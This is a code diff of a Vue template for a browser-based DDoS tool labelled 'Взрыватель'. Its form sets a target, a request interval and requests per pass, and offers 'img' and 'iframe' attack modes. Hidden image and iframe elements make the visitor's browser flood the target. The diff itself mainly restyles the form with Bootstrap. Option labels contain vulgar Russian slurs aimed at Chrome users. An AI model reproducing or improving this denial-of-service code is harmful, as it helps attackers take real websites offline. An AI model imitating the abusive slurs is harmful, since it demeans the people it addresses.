@@ -1,6 +1,7 @@
 <template>
   <div id="home">
     <div id="ddos">
+      <h2>Взрыватель</h2>
       <div id="meta">
         <div class="point">
           <p>Цель: <a :href="point">{{ point }}</a></p>
@@ -11,20 +12,37 @@
       </div>
       <div id="loic">
         <div class="mode">
-          <div class="interval">
-            <label>Интервал (милисекунды): <input type="number" v-model.number="interval"></label>
+          <div class="interval form-group">
+            <div class="input-group">
+              <div class="input-group-prepend">
+                <div class="input-group-text">Интервал (милисекунды)</div>
+              </div>
+              <input type="number" v-model.number="interval" class="form-control">
+            </div>
           </div>
-          <div class="requestsPerPass">
-            <label>Запросов за проход: <input type="number" v-model.number="requestsPerPass"></label>
+          <div class="requestsPerPass form-group">
+            <div class="input-group">
+              <div class="input-group-prepend">
+                <div class="input-group-text">
+                  Запросов за проход
+                </div>
+              </div>
+              <input type="number" v-model.number="requestsPerPass" class="form-control">
+            </div>
           </div>
-          <div>
-            <select v-model='mode'>
-              <option value='img'>Image (лайтовая хуйня, НЕ РАБОТАЕТ У ХРОМОБЛЯДКОВ СРАНЫХ ЕБАЛ ВАС В РОТ ПИДОРАСЫ)</option>
-              <option value='iframe'>Iframe (пежже дудосит)</option>
-            </select>
+          <div class="attackType form-group">
+            <div class="input-group">
+              <div class="input-group-prepend">
+                <div class="input-group-text">Тип атаки</div>
+              </div>
+              <select v-model='mode' class="form-control">
+                <option value='img'>Image (лайтовая хуйня, НЕ РАБОТАЕТ У ХРОМОБЛЯДКОВ СРАНЫХ ЕБАЛ ВАС В РОТ ПИДОРАСЫ)</option>
+                <option value='iframe'>Iframe (пежже дудосит)</option>
+              </select>
+            </div>
           </div>
-          <button v-if='!started' v-on:click="start()">Старт</button>
-          <button v-else v-on:click="stop()">Стоп</button>
+          <button class="btn btn-success" v-if='!started' v-on:click="start()">Старт</button>
+          <button class="btn btn-danger" v-else v-on:click="stop()">Стоп</button>
         </div>
         <img class="hidden" v-if='mode == "img"' v-for='addr in addrs' :src="addr" :alt="addr" :title="addr">
         <iframe class="hidden" v-if="mode == 'iframe'" v-for='addr in addrs' :src="addr"></iframe>
